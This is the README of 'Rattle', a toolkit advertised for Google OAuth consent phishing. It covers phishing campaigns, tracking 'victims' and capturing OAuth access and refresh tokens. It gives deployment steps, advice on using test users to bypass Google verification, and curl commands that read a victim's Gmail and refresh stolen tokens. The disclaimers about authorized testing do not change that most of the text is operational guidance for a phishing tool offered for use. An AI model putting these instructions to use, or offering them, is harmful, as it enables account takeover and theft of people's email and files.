<div align="center">
  <h1>🐍 Rattle</h1>
  <p><strong>Google OAuth Consent Phishing Toolkit</strong></p>
  <p>
    <img src="https://img.shields.io/badge/version-1.0.0-blue" alt="Version">
    <img src="https://img.shields.io/badge/python-3.8+-green" alt="Python">
    <img src="https://img.shields.io/badge/license-MIT-red" alt="License">
    <img src="https://img.shields.io/badge/platform-linux-lightgrey" alt="Platform">
  </p>
  <p><i>Professional-grade OAuth consent phishing framework with a modern web interface</i></p>
</div>

---

## 📋 Overview

**Rattle** is a complete, GUI-driven toolkit for Google OAuth consent phishing. It provides a professional dashboard to create campaigns, capture OAuth tokens, and manage victims—all through a clean web interface.

> ⚠️ **Disclaimer**: This tool is for educational and authorized security testing purposes only. Unauthorized use is illegal. The author assumes no responsibility for misuse.

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🎯 **Campaign Management** | Create, manage, and track multiple phishing campaigns |
| 👤 **Victim Tracking** | Monitor victims, IP addresses, and statuses |
| 🔑 **Token Capture** | Capture OAuth access and refresh tokens |
| 📊 **Dashboard Analytics** | Real-time statistics and activity charts |
| 📧 **Email Scopes** | Request `gmail.readonly` for email access |
| 🔄 **Token Refresh** | Refresh tokens without re-authentication |
| 📱 **QR Code Generation** | Generate QR codes for phishing links |
| 🖥️ **Modern UI** | Clean, responsive Bootstrap-based interface |
| 🔒 **SSL-Ready** | Built-in support for HTTPS/SSL via Nginx |

---

## 🚀 Quick Start

### Prerequisites

- Python 3.8+
- Google Cloud Console project with OAuth credentials
- Domain name with DNS configured
- VPS (Ubuntu 20.04/22.04/24.04 recommended)

### Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/rattle.git
cd rattle

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### Configuration

1. **Set up Google OAuth**:
   - Go to [Google Cloud Console](https://console.cloud.google.com)
   - Create a new project
   - Navigate to APIs & Services > OAuth consent screen
   - Set User Type to "External"
   - Add required scopes (e.g., `gmail.readonly`, `drive.readonly`)
   - Add yourself as a test user
   - Create OAuth Client ID (Web application)
   - Add redirect URI: `https://yourdomain.com/callback`

2. **Configure the app**:
   ```bash
   # Copy example config
   cp config.example.py config.py
   
   # Edit config.py with your credentials
   nano config.py
   ```

3. **Run locally**:
   ```bash
   python3 app.py
   ```

---

## 🖥️ Production Deployment

### One-Click Nginx + SSL Setup

```bash
# Download the setup script
wget https://raw.githubusercontent.com/yourusername/rattle/main/setup_nginx_ssl.sh

# Make it executable
chmod +x setup_nginx_ssl.sh

# Run it
sudo ./setup_nginx_ssl.sh
```

The script will:
- Install Nginx, Certbot, and dependencies
- Configure Nginx as a reverse proxy
- Obtain SSL certificate from Let's Encrypt
- Enable automatic certificate renewal

### Manual Deployment

```bash
# Install dependencies
sudo apt update
sudo apt install -y nginx certbot python3-certbot-nginx

# Configure Nginx
sudo nano /etc/nginx/sites-available/rattle
# (See setup_nginx_ssl.sh for config template)

# Get SSL certificate
sudo certbot --nginx -d yourdomain.com

# Run with Gunicorn
pip install gunicorn
gunicorn -w 4 -b 127.0.0.1:8000 app:app

# Or as a systemd service
sudo nano /etc/systemd/system/rattle.service
```

---

## 🎯 Usage

### Creating a Campaign

1. Navigate to **Campaigns** > **Create Campaign**
2. Enter your Google Client ID and Client Secret
3. Set the redirect URI (must match Google Cloud Console)
4. Select the scopes you want to request
5. Generate the phishing link

### Capturing Tokens

1. Send the phishing link to the target
2. Target authenticates via Google
3. OAuth token is captured automatically
4. View captured tokens in the **Tokens** section

### Using Captured Tokens

```bash
# Read emails via Gmail API
curl -H "Authorization: Bearer ACCESS_TOKEN" \
"https://gmail.googleapis.com/gmail/v1/users/me/messages"

# Refresh token
curl -X POST https://oauth2.googleapis.com/token \
-d client_id=YOUR_CLIENT_ID \
-d client_secret=YOUR_CLIENT_SECRET \
-d refresh_token=REFRESH_TOKEN \
-d grant_type=refresh_token
```

---

## 📊 Dashboard

The dashboard provides real-time insights:

- Total campaigns
- Active campaigns
- Total victims
- Tokens captured
- Victim activity charts
- Recent token captures

---

## 📁 Project Structure

```
rattle/
├── app.py                 # Main Flask application
├── config.py              # Configuration file
├── models.py              # Database models
├── requirements.txt       # Python dependencies
├── setup_nginx_ssl.sh     # Nginx + SSL automation
├── static/
│   ├── css/
│   │   └── style.css      # Custom styles
│   └── js/
│       └── app.js         # Frontend JavaScript
└── templates/
    ├── base.html          # Base template
    ├── login.html         # Login page
    ├── dashboard.html     # Main dashboard
    ├── campaigns.html     # Campaign management
    ├── campaign_create.html
    ├── campaign_detail.html
    ├── victims.html       # Victim list
    ├── tokens.html        # Token management
    └── settings.html      # Settings page
```

---

## 🔧 Scopes Reference

| Scope | Description | Google Tier |
|-------|-------------|-------------|
| `openid` | Basic user identification | Non-sensitive |
| `profile` | User profile information | Non-sensitive |
| `email` | User email address | Non-sensitive |
| `gmail.readonly` | Read all emails | **Restricted** |
| `gmail.modify` | Read and modify labels | **Restricted** |
| `gmail.send` | Send emails | Sensitive |
| `drive.readonly` | Read Drive files | **Restricted** |
| `drive.file` | File-level Drive access | Sensitive |

> **Note**: Restricted scopes require Google verification for public use.

---

## 🛡️ Security Notes

1. **Use HTTPS**: Always deploy with SSL in production
2. **Strong Passwords**: Change default admin credentials immediately
3. **Test Users**: Add test users to bypass Google verification
4. **Limited Scopes**: Request only necessary scopes
5. **VPS Security**: Use firewalls and fail2ban

---

## 📝 Requirements

- Python 3.8+
- Flask 2.3+
- SQLAlchemy 2.0+
- Gunicorn (production)
- Nginx (production)
- Certbot (SSL)

---

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push to branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

---

## 📄 License

Distributed under the MIT License. See `LICENSE` for more information.

---

## ⚠️ Disclaimer

> **This tool is for educational purposes and authorized security testing only.**
>
> - You must have explicit permission to test any target
> - Unauthorized access to computer systems is illegal
> - The author assumes no responsibility for misuse
> - Use at your own risk

---

## 📬 Contact

- **Author**: [Your Name]
- **GitHub**: [@yourusername](https://github.com/yourusername)
- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)

---

<div align="center">
  <sub>Built with ❤️ for security research</sub>
</div>
